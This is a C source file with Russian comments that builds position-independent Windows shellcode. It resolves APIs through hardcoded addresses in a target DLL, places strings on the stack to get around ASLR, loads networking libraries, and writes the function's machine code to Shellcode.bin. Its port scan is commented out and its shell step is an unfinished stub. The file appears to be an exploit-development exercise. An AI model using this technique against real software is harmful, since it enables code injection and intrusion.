
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <iphlpapi.h>
#include <Windows.h>
#include <intrin.h>

size_t _strlen(const char*);
void _memset(void* s, int c, size_t n);

void ShellcodeEntry()
{
	//
	//	Адреса функций - это адреса call инструкций
	// вызовов соответствующих функций, из билиотеки func.dll
	HMODULE(*_GetModuleHandleA)(LPCSTR) = 0x62501B48;
	FARPROC(*_GetProcAddress)(HMODULE, LPCSTR) = 0x62501B40;

	//
	//  __cdecl, так как из func.dll они вызываются согласно 
	// этой конвенции.
	void* (*__cdecl _malloc)(size_t) = 0x62501AD8;
	void (*__cdecl _free)(void*) = 0x62501AE8;

	//
	//  Си строки задаем в следующем виде, чтобы они размещались на стеке,
	// как локальные переменные. При другом виде задания строки, обращения к ней 
	// будут осуществлены с помощью прямых адресов, что недопустимо при написании 
	// шелкода из-за ASLR.
	char cstrKernel32dll[] = { 'K','e','r','n','e','l','3','2','.','d','l','l','\0' };
	HMODULE hKernel32dll = _GetModuleHandleA(cstrKernel32dll);

	char cstrExitProcess[] = { 'E','x','i','t','P','r','o','c','e','s','s','\0' };
	void (*f_ExitProcess)(UINT) = _GetProcAddress(hKernel32dll, cstrExitProcess);

	char cstrCreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A','\0' };
	HANDLE(*f_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)
		= _GetProcAddress(hKernel32dll, cstrCreateFileA);
	if (f_CreateFileA == NULL)
	{
		f_ExitProcess(2);
	}

	char cstrWriteFile[] = { 'W','r','i','t','e','F','i','l','e','\0' };
	BOOL(*f_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED) = _GetProcAddress(hKernel32dll, cstrWriteFile);
	if (f_WriteFile == NULL)
	{
		f_ExitProcess(3);
	}

	char cstrLoadLobraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','\0' };
	HMODULE(*f_LoadLibraryA)(LPCSTR) = _GetProcAddress(hKernel32dll, cstrLoadLobraryA);
	if (f_LoadLibraryA == NULL)
	{
		f_ExitProcess(4);
	}

	char cstrIphlpapidll[] = { 'I','p','h','l','p','a','p','i','.','d','l','l','\0' };
	HMODULE hIphlpapidll = f_LoadLibraryA(cstrIphlpapidll);
	if (hIphlpapidll == NULL)
	{
		f_ExitProcess(5);
	}

	char cstrGetAdaptersInfo[] = { 'G','e','t','A','d','a','p','t','e','r','s','I','n','f','o','\0' };
	ULONG(*f_GetAdaptersInfo)(PIP_ADAPTER_INFO, PULONG) = _GetProcAddress(hIphlpapidll, cstrGetAdaptersInfo);
	if (f_GetAdaptersInfo == NULL)
	{
		f_ExitProcess(6);
	}

	char cstrFileName[] = { 'r','e','s','u','l','t','.','t','x','t','\0' };
	HANDLE hFile = f_CreateFileA(cstrFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		f_ExitProcess(7);
	}

	char cstrWs2_32dll[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
	HMODULE hWs2_32dll = f_LoadLibraryA(cstrWs2_32dll);

	char cstrWSAStartup[] = { 'W','S','A','S','t','a','r','t','u','p','\0' };
	int (*f_WSAStartup)(WORD,LPWSADATA) = _GetProcAddress(hWs2_32dll, cstrWSAStartup);
	if (f_WSAStartup == INVALID_HANDLE_VALUE)
	{
		f_ExitProcess(8);
	}	
	char cstrSocket[] = { 's','o','c','k','e','t','\0' };
	int (*f_Socket)(int,int,int) = _GetProcAddress(hWs2_32dll, cstrSocket);
	if (f_Socket == NULL)
	{
		f_ExitProcess(9);
	}

	//
	// shell
	SOCKET sock;
	int error;
	WSADATA ws;
	char* buff= (char*)_malloc(32);//[32];
	int MinPort = 64684;
	int MaxPort = 64723;
	int port;


	f_WSAStartup(MAKEWORD(2, 2), &ws);
		//устанавливаем socket

	SOCKADDR_IN sock_addr;
	//ZeroMemory(&sock_addr, sizeof(sock_addr));
	_memset(&sock_addr, 0, sizeof(sock_addr));
	sock_addr.sin_family = AF_INET;
	char address[] = { '1','2','7' ,'.' ,'0' ,'.' ,'0' ,'.' ,'1' };
	sock_addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");


	// Вводим Port
	/*for (MinPort; MinPort <= MaxPort; MinPort++)
	{
		port = MinPort;
		sock_addr.sin_port = htons(port);
		if (SOCKET_ERROR == (connect(sock, (SOCKADDR_IN*)&sock_addr, sizeof(sock_addr))))
		{
			printf("\nPort %d closed", port);
		}
		else
		{
			printf("\nPort %d Open", port);
		}
	}
*/
	//shell
	f_ExitProcess(1000);
}

//
// Моя реализации strlen. Ну как моя, этот велик я украл.
size_t _strlen(const char* str)
{
	size_t length = 0;

	while (*str++)
		length++;

	return (length);
}

void _memset(void* s, int c, size_t n)
{
	char* p = s;
	while (n--) *p++ = c;
}

void END_SHELLCODE(void) {}

int main()
{
	FILE* fShellcode = fopen("Shellcode.bin", "wb");
	if (fShellcode == NULL)
	{
		exit(printf("Error: fopen returned NULL"));
	}

	//
	//  Записываем в файл машинный код функции ShellcodeEntry.
	fwrite(ShellcodeEntry, sizeof(char) ,(char*)END_SHELLCODE - (char*)ShellcodeEntry, fShellcode);

	fclose(fShellcode);

	printf("\nShellcode size = %u", (char*)END_SHELLCODE - (char*)ShellcodeEntry);

	return 0;
}